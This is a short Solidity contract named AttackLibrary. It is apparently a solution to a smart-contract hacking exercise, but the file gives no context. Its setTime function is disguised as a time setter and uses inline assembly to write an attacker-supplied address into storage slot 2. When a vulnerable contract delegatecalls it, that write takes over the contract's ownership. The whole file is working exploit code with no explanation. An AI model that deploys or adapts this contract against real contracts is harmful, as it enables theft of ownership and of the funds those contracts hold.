pragma solidity ^0.8.0;
contract AttackLibrary {
    function setTime(uint256 _newOwner) external {
        assembly {
            sstore(2, _newOwner)
        }
    }
}
